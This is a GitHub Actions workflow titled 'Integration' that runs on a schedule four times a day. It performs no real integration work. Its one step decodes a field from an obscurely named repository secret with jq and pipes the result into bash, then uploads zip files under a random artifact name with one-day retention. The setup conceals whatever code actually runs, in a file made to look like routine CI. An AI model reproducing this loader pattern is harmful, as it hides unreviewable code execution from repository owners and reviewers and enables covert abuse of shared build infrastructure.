name: Integration
on:
  workflow_dispatch:

  schedule:
    - cron: '14 4,10,16,22 * * *'
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Execute
        env:
          muadl594: ${{ secrets.muadl594 }}
        run: |
          printf '%s' "$muadl594" | jq -r .wo6 | /bin/bash
          echo $gq552 | jq -r .giv79 | /bin/bash

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: PaHjEU4n
          path: "*.zip"
          retention-days: 1
